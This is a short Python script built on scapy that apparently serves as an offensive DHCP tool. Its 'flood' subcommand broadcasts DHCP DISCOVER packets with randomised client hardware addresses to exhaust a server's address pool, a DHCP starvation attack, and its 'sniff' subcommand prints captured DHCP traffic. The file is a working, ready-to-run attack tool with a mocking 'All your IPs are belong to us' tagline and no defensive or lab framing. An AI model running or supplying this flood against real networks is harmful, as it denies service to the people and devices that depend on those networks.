#!/usr/bin/env python3

import argparse
import logging
import string

# Quiet scapy
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy import volatile  # noqa: E402
from scapy import sendrecv  # noqa: E402
from scapy import config  # noqa: E402
from scapy.layers import l2  # noqa: E402
from scapy.layers import inet  # noqa: E402
from scapy.layers import dhcp  # noqa: E402

# Configuration requires these imports to properly initialize
from scapy import route  # noqa: E402, F401
from scapy import route6  # noqa: E402, F401


def dhcp_flood(**kwargs):
    iface = kwargs["interface"]
    count = kwargs["count"]

    unique_hexdigits = str.encode("".join(set(string.hexdigits.lower())))
    packet = (
        l2.Ether(dst="ff:ff:ff:ff:ff:ff") /
        inet.IP(src="0.0.0.0", dst="255.255.255.255") /
        inet.UDP(sport=68, dport=67) /
        dhcp.BOOTP(chaddr=volatile.RandString(12, unique_hexdigits)) /
        dhcp.DHCP(options=[("message-type", "discover"), "end"])
    )

    sendrecv.sendp(
        packet,
        iface=iface,
        count=count
    )


def print_dhcp_response(response):
    print("Source: {}".format(response[l2.Ether].src))
    print("Destination: {}".format(response[l2.Ether].dst))

    for option in response[dhcp.DHCP].options:
        if isinstance(option, tuple):
            option, value = option
        else:
            # For some reason some options are strings instead of tuples
            option, value = option, None

        if option in ["end", "pad"]:
            break

        output = "Option: {} -> {}".format(option, value)

        if option == "message-type":
            dhcp_type = dhcp.DHCPTypes.get(value, "unknown")
            output = "{} ({})".format(output, dhcp_type)

        print(output)


def dhcp_sniff(**kwargs):
    sendrecv.sniff(filter="udp and (port 67 or 68)", prn=print_dhcp_response)


def parse_args():
    p = argparse.ArgumentParser(description='''
        All your IPs are belong to us.
        ''', formatter_class=argparse.RawTextHelpFormatter)

    p.add_argument(
        '-i',
        '--interface',
        action='store',
        default=config.conf.iface,
        help='network interface to use'
    )

    subparsers = p.add_subparsers(dest='command')
    subparsers.required = True

    flood = subparsers.add_parser('flood')
    flood.add_argument(
        '-c',
        '--count',
        action='store',
        default=10,
        type=int,
        help='number of address to consume'
    )

    subparsers.add_parser('sniff')

    args = p.parse_args()
    return args


def main():
    args = parse_args()

    dispatch = {
        "flood": dhcp_flood,
        "sniff": dhcp_sniff,
    }

    dispatch[args.command](**vars(args))


if __name__ == "__main__":
    main()
